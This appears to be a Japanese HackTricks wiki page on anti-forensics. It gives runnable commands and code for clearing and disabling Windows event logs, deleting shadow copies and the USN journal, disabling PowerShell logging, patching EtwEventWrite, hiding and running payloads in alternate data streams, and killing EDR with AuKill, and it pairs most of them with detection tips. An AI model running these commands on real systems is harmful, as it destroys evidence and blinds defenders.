# アンチフォレンジック技術

{{#include ../../banners/hacktricks-training.md}}

## タイムスタンプ

攻撃者は**ファイルのタイムスタンプを変更すること**に興味を持つかもしれません。\
タイムスタンプは、MFT内の属性`$STANDARD_INFORMATION` \_\_ と \_\_ `$FILE_NAME`に見つけることができます。

両方の属性には4つのタイムスタンプがあります: **変更**, **アクセス**, **作成**, および **MFTレジストリ変更** (MACEまたはMACB)。

**Windowsエクスプローラー**や他のツールは、**`$STANDARD_INFORMATION`**からの情報を表示します。

### TimeStomp - アンチフォレンジックツール

このツールは**`$STANDARD_INFORMATION`**内のタイムスタンプ情報を**変更**しますが、**`$FILE_NAME`**内の情報は**変更しません**。したがって、**疑わしい** **活動を特定することが可能です**。

### Usnjrnl

**USNジャーナル** (Update Sequence Number Journal)は、NTFS (Windows NTファイルシステム)の機能で、ボリュームの変更を追跡します。[**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv)ツールを使用すると、これらの変更を調査できます。

![](<../../images/image (801).png>)

前の画像は、**ツール**によって表示された**出力**で、ファイルに対して**いくつかの変更が行われた**ことが観察できます。

### $LogFile

**ファイルシステムへのすべてのメタデータ変更は**、[書き込み先行ログ](https://en.wikipedia.org/wiki/Write-ahead_logging)として知られるプロセスで記録されます。記録されたメタデータは、NTFSファイルシステムのルートディレクトリにある`**$LogFile**`という名前のファイルに保持されます。[LogFileParser](https://github.com/jschicht/LogFileParser)のようなツールを使用して、このファイルを解析し、変更を特定できます。

![](<../../images/image (137).png>)

再び、ツールの出力では、**いくつかの変更が行われた**ことが確認できます。

同じツールを使用して、**タイムスタンプが変更された時刻を特定することが可能です**：

![](<../../images/image (1089).png>)

- CTIME: ファイルの作成時刻
- ATIME: ファイルの変更時刻
- MTIME: ファイルのMFTレジストリ変更
- RTIME: ファイルのアクセス時刻

### `$STANDARD_INFORMATION` と `$FILE_NAME` の比較

疑わしい変更されたファイルを特定する別の方法は、両方の属性の時間を比較して**不一致**を探すことです。

### ナノ秒

**NTFS**のタイムスタンプは**100ナノ秒**の**精度**を持っています。したがって、2010-10-10 10:10:**00.000:0000のようなタイムスタンプを持つファイルを見つけることは非常に**疑わしい**です。

### SetMace - アンチフォレンジックツール

このツールは、両方の属性`$STARNDAR_INFORMATION`と`$FILE_NAME`を変更できます。ただし、Windows Vista以降は、ライブOSでこの情報を変更する必要があります。

## データ隠蔽

NFTSはクラスターと最小情報サイズを使用します。つまり、ファイルがクラスターと半分を占有している場合、**残りの半分はファイルが削除されるまで使用されません**。したがって、このスラックスペースに**データを隠すことが可能です**。

slackerのようなツールを使用すると、この「隠された」スペースにデータを隠すことができます。ただし、`$logfile`や`$usnjrnl`の分析により、いくつかのデータが追加されたことが示される可能性があります：

![](<../../images/image (1060).png>)

その後、FTK Imagerのようなツールを使用してスラックスペースを取得することが可能です。この種のツールは、内容を難読化または暗号化して保存することができます。

## UsbKill

これは、**USB**ポートに変更が検出された場合にコンピュータを**シャットダウンする**ツールです。\
これを発見する方法は、実行中のプロセスを検査し、**実行中の各Pythonスクリプトをレビューする**ことです。

## ライブLinuxディストリビューション

これらのディストリビューションは**RAM**メモリ内で**実行されます**。検出する唯一の方法は、**NTFSファイルシステムが書き込み権限でマウントされている場合**です。読み取り権限のみでマウントされている場合、侵入を検出することはできません。

## セキュア削除

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

## Windows設定

フォレンジック調査をはるかに困難にするために、いくつかのWindowsログ記録方法を無効にすることが可能です。

### タイムスタンプの無効化 - UserAssist

これは、ユーザーによって各実行可能ファイルが実行された日時を保持するレジストリキーです。

UserAssistを無効にするには、2つのステップが必要です：

1. 2つのレジストリキー、`HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs`と`HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`をゼロに設定して、UserAssistを無効にしたいことを示します。
2. `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`のようなレジストリサブツリーをクリアします。

### タイムスタンプの無効化 - Prefetch

これは、Windowsシステムのパフォーマンスを向上させる目的で実行されたアプリケーションに関する情報を保存します。ただし、これはフォレンジック実践にも役立ちます。

- `regedit`を実行
- ファイルパス`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`を選択
- `EnablePrefetcher`と`EnableSuperfetch`の両方を右クリック
- 各々の値を1（または3）から0に変更するために修正を選択
- 再起動

### タイムスタンプの無効化 - 最終アクセス時刻

NTFSボリュームからフォルダーが開かれるたびに、システムは各リストされたフォルダーの**タイムスタンプフィールドを更新するための時間を取ります**。これは、最終アクセス時刻と呼ばれます。NTFSボリュームが頻繁に使用される場合、これがパフォーマンスに影響を与える可能性があります。

1. レジストリエディタを開く (Regedit.exe)。
2. `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`に移動します。
3. `NtfsDisableLastAccessUpdate`を探します。存在しない場合は、このDWORDを追加し、その値を1に設定してプロセスを無効にします。
4. レジストリエディタを閉じ、サーバーを再起動します。

### USB履歴の削除

すべての**USBデバイスエントリ**は、PCまたはラップトップにUSBデバイスを接続するたびに作成されるサブキーを含む**USBSTOR**レジストリキーの下にWindowsレジストリに保存されます。このキーはここにあります`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`。**これを削除することで**、USB履歴を削除します。\
また、[**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html)ツールを使用して、削除したことを確認することもできます（および削除するために）。

USBに関する情報を保存する別のファイルは、`C:\Windows\INF`内の`setupapi.dev.log`ファイルです。これも削除する必要があります。

### シャドウコピーの無効化

**シャドウコピーをリスト**するには`vssadmin list shadowstorage`\
**削除**するには`vssadmin delete shadow`を実行します。

GUIを介して削除することも可能で、[https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)で提案された手順に従います。

シャドウコピーを無効にするには、[こちらの手順](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows)を参照してください：

1. Windowsスタートボタンをクリックした後、テキスト検索ボックスに「services」と入力してサービスプログラムを開きます。
2. リストから「Volume Shadow Copy」を見つけて選択し、右クリックしてプロパティにアクセスします。
3. 「スタートアップの種類」ドロップダウンメニューから「無効」を選択し、変更を確認するために「適用」と「OK」をクリックします。

シャドウコピーでコピーされるファイルの構成を変更することも可能で、レジストリ`HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`で設定できます。

### 削除されたファイルの上書き

- **Windowsツール**を使用できます：`cipher /w:C` これは、Cドライブ内の未使用のディスクスペースからデータを削除するようにcipherに指示します。
- [**Eraser**](https://eraser.heidi.ie)のようなツールを使用することもできます。

### Windowsイベントログの削除

- Windows + R --> eventvwr.msc --> "Windows Logs"を展開 --> 各カテゴリを右クリックして「ログのクリア」を選択
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Windowsイベントログの無効化

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- サービスセクション内で「Windows Event Log」サービスを無効にします。
- `WEvtUtil.exec clear-log`または`WEvtUtil.exe cl`

### $UsnJrnlの無効化

- `fsutil usn deletejournal /d c:`

---

## 高度なログ記録とトレース改ざん (2023-2025)

### PowerShell ScriptBlock/Module Logging

最近のWindows 10/11およびWindows Serverのバージョンは、`Microsoft-Windows-PowerShell/Operational` (イベント4104/4105/4106)の下に**豊富なPowerShellフォレンジックアーティファクト**を保持します。攻撃者は、これらをオンザフライで無効にしたり消去したりすることができます：
```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
Remove-WinEvent               # requires admin & Win11 23H2+
```
防御者は、これらのレジストリキーの変更と大量のPowerShellイベントの削除を監視するべきです。

### ETW (Event Tracing for Windows) パッチ

エンドポイントセキュリティ製品はETWに大きく依存しています。2024年の人気の回避方法は、メモリ内で`ntdll!EtwEventWrite`/`EtwEventWriteFull`をパッチして、すべてのETW呼び出しがイベントを発生させることなく`STATUS_SUCCESS`を返すようにすることです。
```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
patch, sizeof(patch), NULL);
```
Public PoCs (e.g. `EtwTiSwallow`) は、PowerShell または C++ で同じプリミティブを実装しています。  
パッチが **プロセスローカル** であるため、他のプロセス内で実行されている EDR はこれを見逃す可能性があります。  
検出: メモリ内の `ntdll` とディスク上の `ntdll` を比較するか、ユーザーモードの前にフックします。

### Alternate Data Streams (ADS) 復活

2023年のマルウェアキャンペーン（例: **FIN12** ローダー）では、従来のスキャナーの視界から外れるために、ADS 内に第二段階のバイナリをステージングしているのが確認されています:
```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```
ストリームを列挙するには、`dir /R`、`Get-Item -Stream *`、またはSysinternalsの`streams64.exe`を使用します。ホストファイルをFAT/exFATにコピーするか、SMB経由でコピーすると、隠しストリームが削除され、調査者がペイロードを回復するために使用できます。

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driverは、ランサムウェア侵入における**アンチフォレンジック**に日常的に使用されています。オープンソースツール**AuKill**は、署名されたが脆弱なドライバー（`procexp152.sys`）をロードして、暗号化およびログ破壊**の前に**EDRおよびフォレンジックセンサーを一時停止または終了させます。
```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```
ドライバーはその後削除され、最小限のアーティファクトが残ります。  
緩和策：Microsoftの脆弱なドライバーブロックリスト（HVCI/SAC）を有効にし、ユーザーが書き込み可能なパスからのカーネルサービスの作成を警告します。

---

## Linuxアンチフォレンジックス：自己パッチとクラウドC2（2023–2025）

### 検出を減らすために妥協されたサービスを自己パッチする（Linux）  
敵対者は、再利用を防ぎ、脆弱性に基づく検出を抑制するために、サービスを悪用した直後に「自己パッチ」を行うことが増えています。アイデアは、脆弱なコンポーネントを最新の正当なアップストリームバイナリ/JARに置き換えることで、スキャナーがホストをパッチ済みとして報告しつつ、持続性とC2を維持することです。

例：Apache ActiveMQ OpenWire RCE（CVE‑2023‑46604）  
- ポストエクスプロイト後、攻撃者はMaven Central（repo1.maven.org）から正当なJARを取得し、ActiveMQインストール内の脆弱なJARを削除し、ブローカーを再起動しました。  
- これにより、初期のRCEは閉じられましたが、他の足場（cron、SSH設定の変更、別のC2インプラント）は維持されました。

運用例（例示的）
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```
Forensic/hunting tips
- サービスディレクトリを確認して、スケジュールされていないバイナリ/JARの置き換えを探します：
- Debian/Ubuntu: `dpkg -V activemq` を実行し、ファイルのハッシュ/パスをリポジトリミラーと比較します。
- RHEL/CentOS: `rpm -Va 'activemq*'`
- パッケージマネージャーに所有されていないディスク上のJARバージョンや、バンド外で更新されたシンボリックリンクを探します。
- タイムライン: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` を使用して、ctime/mtimeを侵害ウィンドウと相関させます。
- シェル履歴/プロセステレメトリ: 初期の悪用直後に `curl`/`wget` を `repo1.maven.org` または他のアーティファクトCDNに対して使用した証拠。
- 変更管理: “パッチ”を適用したのは誰で、なぜ適用されたのかを検証し、パッチバージョンが存在するだけでは不十分です。

### Cloud‑service C2 with bearer tokens and anti‑analysis stagers
観察されたトレードクラフトは、複数の長距離C2パスとアンチ分析パッケージングを組み合わせていました：
- サンドボックス化や静的分析を妨げるためのパスワード保護されたPyInstaller ELFローダー（例：暗号化されたPYZ、`/_MEI*`の下での一時的な抽出）。
- インジケーター: `strings` ヒットの例として `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`。
- ランタイムアーティファクト: `/tmp/_MEI*` への抽出またはカスタム `--runtime-tmpdir` パス。
- ハードコーディングされたOAuthベアラートークンを使用したDropboxバックアップC2。
- ネットワークマーカー: `api.dropboxapi.com` / `content.dropboxapi.com` で `Authorization: Bearer <token>`。
- 通常ファイルを同期しないサーバーワークロードからDropboxドメインへのアウトバウンドHTTPSを探すために、プロキシ/NetFlow/Zeek/Suricataでハントします。
- トンネリングを介した並行/バックアップC2（例：Cloudflare Tunnel `cloudflared`）、1つのチャネルがブロックされた場合でも制御を維持します。
- ホストIOC: `cloudflared` プロセス/ユニット、`~/.cloudflared/*.json` の設定、Cloudflareエッジへのアウトバウンド443。

### Persistence and “hardening rollback” to maintain access (Linux examples)
攻撃者は自己パッチと耐久性のあるアクセスパスを頻繁に組み合わせます：
- Cron/Anacron: 各 `/etc/cron.*/` ディレクトリ内の `0anacron` スタブの編集による定期的な実行。
- ハント:
```bash
for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
```
- SSH設定のハードニングロールバック: ルートログインを有効にし、低特権アカウントのデフォルトシェルを変更します。
- ルートログインの有効化をハント:
```bash
grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
# "yes" や過度に許可された設定のようなフラグ値
```
- システムアカウント（例：`games`）での疑わしいインタラクティブシェルをハント:
```bash
awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
```
- クラウドC2にも接続するランダムで短い名前のビーコンアーティファクト（8文字のアルファベット）をディスクにドロップします：
- ハント:
```bash
find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
```

防御者は、これらのアーティファクトを外部露出およびサービスパッチイベントと相関させて、初期の悪用を隠すために使用されたアンチフォレンジック自己修復を明らかにする必要があります。

## References

- Sophos X-Ops – “AuKill: A Weaponized Vulnerable Driver for Disabling EDR” (March 2023)
https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr
- Red Canary – “Patching EtwEventWrite for Stealth: Detection & Hunting” (June 2024)
https://redcanary.com/blog/etw-patching-detection

- [Red Canary – Patching for persistence: How DripDropper Linux malware moves through the cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

{{#include ../../banners/hacktricks-training.md}}
